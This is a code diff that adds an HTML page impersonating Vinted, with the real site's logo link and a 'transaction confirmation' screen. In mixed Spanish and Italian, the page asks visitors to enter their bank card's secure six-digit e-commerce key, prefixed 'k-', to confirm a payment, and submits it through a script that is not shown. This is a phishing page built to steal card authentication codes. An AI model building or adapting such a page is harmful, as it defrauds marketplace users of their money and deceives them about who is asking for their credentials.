@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="./styles/style.css" />
+    <title>Vinted</title>
+  </head>
+  <body>
+    <header>
+      <div class="logo-main">
+        <a href="https://www.vinted.es/">
+          <img src="./images/logo.svg" alt="" />
+        </a>
+      </div>
+
+    </header>
+    <main>
+      <div class="container">
+        <div class="content">
+          <div class="content-title">
+            <p>Confirmacion de Transacction</p>
+          </div>
+
+          <div class="content-photos">
+            <a>
+              <img class="key" src="./images/key.png" alt="" />
+            </a>
+          </div>
+
+          <div class="content-paragraph">
+            <a>
+              Per motivi di sicurezza, oltre al codice ricevuto, inserite la vostra chiave e-commerce sicura "key6" per confermare il pagamento con carta. Esempio: 
+              la vostra password è "235789", inserite "k-235789".
+              Se avete dimenticato questa password di 6 cifre,
+              potete verificarla nella sezione 
+              sicurezza del sito e dell'app.
+            </a>
+          </div>
+
+          <div class="content-btns">
+            <div class="passcode-input">
+              <input id="input" placeholder="|KEY6|" />
+              <div class="campo">
+                <a>El campo de entrada KEY6 no debe estar vacío!</a
+                >
+              </div>
+            </div>
+
+            <div onclick="handleClick()" class="continuar">
+              <a>Continuar</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div>
+        <img src="./images/footer.png" />
+      </div>
+    </footer>
+
+    <script src="./scripts/script.js"></script>
+  </body>
+</html>
